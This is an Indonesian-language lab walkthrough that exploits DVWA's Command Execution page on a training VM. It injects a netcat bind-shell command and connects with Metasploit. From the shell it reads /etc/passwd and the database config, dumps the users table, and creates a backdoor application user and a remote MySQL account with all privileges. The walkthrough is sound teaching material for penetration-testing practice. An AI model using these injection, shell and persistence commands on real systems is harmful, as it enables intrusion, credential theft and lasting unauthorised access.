# Lesson 4 - Using Metasploit with Command Execution

## Perhatian!!

1. Menggunakan Fedora dan Backtrack, karena:
	* menggunakan Backtrack karena Versi metasploit pada kali sudah lebih baru dan selalu menjalankan perintah exploit sebagai job
	* menggunakan fedora karena diharuskan mematikan selinux


## Set DVWA dengan low Security

1. Login pada dvwa
	* username: admin
	* password: password
2. Lalu set Security menjadi low
	* klik "DVWA security"
	* set menjadi *low*

![1 set fedora low](https://user-images.githubusercontent.com/17487644/34214252-7e60bd60-e5d4-11e7-98bf-1cef8db4e81f.png)

3. Jalankan	Script
	* klik "Command Execution"
	* lalu masukan script:
		<IP fedora>;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe

![2 masuk command execution](https://user-images.githubusercontent.com/17487644/34214253-7f250e40-e5d4-11e7-8e3c-cd6ffffecca1.png)

	* lalu halaman akan berhenti dan selalu loading (menunggu exploit)

![3 submit command](https://user-images.githubusercontent.com/17487644/34214254-7f9760f8-e5d4-11e7-85db-c70ab9d0247a.png)

## Menggunakan Metasploit framework

1. Buka Terminal
2. ketik "msfconsole"
3. Set Payload
	1. use multi/handler
	2. set PAYLOAD linux/x86/shell/bind_tcp
	3. show options
	4. set RHOST <IP Fedora>
	5. exploit
4. Anda telah masuk dalam Netcat DVWA

![4 exploit](https://user-images.githubusercontent.com/17487644/34214255-7fcec304-e5d4-11e7-942d-84f91825ac81.png)

5. Cek akun yang anda gunakan, gunakan command:
	1. whoami
	2. grep apache /etc/passwd
	3. grep apache /etc/group

![whoami](https://user-images.githubusercontent.com/17487644/34214251-7dd8452a-e5d4-11e7-95ba-e5a08f741c88.png)

6. Periksa proses dan hak akses direktori, gunakan command:
	1. ps -eaf | grep http
	2. pwd
	3. ls -ld /var/www/html
	4. ls -ld /var/www/html/dvwa
	5. ls -l /var/www/html/dvwa

![ps -eaf](https://user-images.githubusercontent.com/17487644/34214246-7b2f0fde-e5d4-11e7-998d-5e230aa5acdc.png)

7. Periksa Database, gunakan command:
	1. ls -l /var/www/html/dvwa/config
	2. cat /var/www/html/dvwa/config/config.inc.php

![ls config cat](https://user-images.githubusercontent.com/17487644/34214233-78a5d95a-e5d4-11e7-9577-5daaa7c0d08b.png)

8. Periksa Mysql, gunakan command:
	* Disini menggunakan username root dan password tooroot
	1. echo "show databases;" | mysql -u<USERNAME> -p<PASSWORD>
	2. echo "use dvwa; show tables;" | mysql -u<USERNAME> -p<PASSWORD>
	3. echo "use dvwa; desc users;" | mysql -u<USERNAME> -p<PASSWORD>
	4. echo "select * from dvwa.users;" | mysql -u<USERNAME> -p<PASSWORD>

![sql exploration](https://user-images.githubusercontent.com/17487644/34214249-7c9a1a9e-e5d4-11e7-9202-c4b906397a27.png)

9. Buat user baru
	* Disini digunakan:
		* First name = "Aldi"
		* Last name = "Makan"
		* username = "Pangsit"
	1. echo "insert into dvwa.users values ('6','Aldi','Makan','Pangsit',MD5('123456'),'NA');" | mysql -u<USERNAME> -p<PASSWORD>
	2. echo "select * from dvwa.users;" | mysql -u<USERNAME> -p<PASSWORD>

![messageimage_1513697543123](https://user-images.githubusercontent.com/17487644/34214934-70e0a93c-e5d6-11e7-9af5-249220c6388f.jpg)

10. Menampilkan informasi tabel Mysql, menggunakan command:
	1. echo "show databases;" | mysql -u<USERNAME> -p<PASSWORD>
	2. echo "use mysql; show tables;" | mysql -u<USERNAME> -p<PASSWORD>
	
![messageimage_1513697766099](https://user-images.githubusercontent.com/17487644/34214935-7129f448-e5d6-11e7-994c-ca472309b6a1.jpg)

11. Buat user Mysql baru, menggunakan command:
	1. echo "use mysql; GRANT ALL PRIVILEGES ON *.* TO 'Aldi_Haxx'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;" | mysql -u<USERNAME> -p<PASSWORD>
	2. echo "select * from mysql.user;" | mysql -u<USERNAME> -p<PASSWORD>

![messageimage_1513698309946](https://user-images.githubusercontent.com/17487644/34214937-7177cf60-e5d6-11e7-9326-52c0d0675a13.jpg)

## Bukti Selesai Lesson 4
1. Gunakan terminal baru
2. mysql -u <USERNAME> -h <IP fedora>-p
	* username tadi yang telah dibuat (tadi menggunakan Aldi_Haxx)
	* lalu inputkan password yang tadi dibuat
3. show databases;

![messageimage_1513698571941](https://user-images.githubusercontent.com/17487644/34214932-6f8ae868-e5d6-11e7-8c52-f347cb9c08e3.jpg)